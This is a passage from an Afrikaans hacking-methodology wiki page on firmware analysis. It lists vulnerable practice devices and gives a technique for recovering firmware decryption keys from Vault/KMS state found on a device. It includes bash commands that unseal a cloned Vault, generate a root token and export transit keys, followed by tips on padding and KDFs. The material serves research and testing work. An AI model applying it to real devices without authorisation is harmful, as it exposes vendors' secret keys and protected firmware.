  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS-/Vault-toestand

Wanneer ’n opdateringsimage klein plaintext-metadata met ’n groot blob met hoë entropie kombineer, doen houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Stort kopskrifte, offsets en lynbreuke met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmwarewagwoord/sessiesleutel omhul.
- Afsonderlike PGP-materiaal in dieselfde lêer beskerm dikwels net egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese sleutelsoektogte (`grep`, `strings`, PEM-/PGP-soektogte) misluk, reverse engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Decompileer die updater-/bestuursbinary en volg wie die geënkripteerde blob lees, watter helper/API dit ontseël en die logiese sleutelnaam wat dit aanvra.
- Soek die onttrekte root-lêerstelsel vir KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook unit-lêers en init-skripte.
- Behandel plaintext `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS-auto-unseal-skripte as gelykstaande aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binary en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing weer uit te voer as om Vault-internals te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Toets die herwonne RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloei gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die lasdata met `Salted__` begin, herhaal die verkoper se OpenSSL-KDF presies (`EVP_BytesToKey`, dikwels MD5 op ouer toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n meer algemene probleem: **herwin die operasionele sleutels aan die toestel se kant, en herhaal dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware kraak met Claude: vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-hacking: Die definitiewe gids tot aanvalle op die Internet van Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Ontginning van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy mi: Nou is jy gekompromitteer](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Ontginning van die Tesla Wall Connector via sy laaipoortverbinding - Deel 2: omseiling van die anti-terugrolmeganisme](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Oor-die-lug-ontginning van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
